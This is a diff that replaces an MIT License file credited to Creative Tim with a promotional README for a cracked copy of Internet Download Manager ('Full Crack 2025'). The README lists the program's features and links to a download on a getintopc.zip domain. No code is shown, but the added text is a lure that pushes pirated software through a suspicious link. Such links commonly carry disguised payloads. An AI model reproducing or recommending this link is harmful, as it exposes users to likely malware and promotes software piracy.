@@ -1,9 +1,17 @@
-<p>MIT License</p>
+# 🚀 Internet Download Manager (IDM) Full Crack 2025 - Boost Your Downloads
 
-<p>Copyright (c) 2018 <a href="https://www.creative-tim.com">Creative Tim</a></p>
+**Internet Download Manager (IDM) Full Patch** is a comprehensive download manager that accelerates your downloads, resumes interrupted files, and enhances productivity with seamless integration into your browser. 
 
-<p>Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:</p>
+![IDM Preview](https://i.ytimg.com/vi/cjdjqaYvm2Q/maxresdefault.jpg)
 
-<p>The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.</p>
+## ✨ Features:
+- ⚡ **Boost download speeds** up to 5x faster than regular download methods
+- 🔄 **Resume broken downloads** and continue without starting over
+- 🗓 **Schedule downloads** at your preferred time and manage bandwidth
+- 🌍 **One-click integration** with all major browsers for easy download management
 
-<p>THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.</p>
+## 🔗 Download Now:
+Click below to get your copy of IDM and start optimizing your downloads today!
+## [Download IDM](https://getintopc.zip/?z=40&n=Get-Into-PC---Download-Free-Software)
+
+## Enjoy
